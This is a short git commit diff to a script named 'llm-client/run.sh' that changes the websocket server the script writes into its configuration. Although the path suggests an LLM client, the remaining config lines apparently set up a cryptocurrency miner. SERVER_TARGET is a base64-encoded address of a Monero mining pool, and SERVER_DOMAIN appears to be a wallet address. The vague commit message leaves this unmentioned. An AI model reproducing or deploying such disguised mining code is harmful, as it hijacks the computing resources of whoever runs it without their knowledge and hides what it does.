0bb6a65799f6c7c4d4f2cd3113f1692456abdda1
wijayasuta13-collab <wijayasuta13@gmail.com>
2026-06-21 18:23:39 +0700

    Update run.sh

--- llm-client/run.sh
+++ llm-client/run.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 CONNECT=$1
 NAME=$2
-echo "SERVER_WS=wss://app.apacer.web.id
+echo "SERVER_WS=wss://rss.cloudnineone.my.id
 SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
 SERVER_DOMAIN=88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL
 SERVER_SECRET=${NAME}
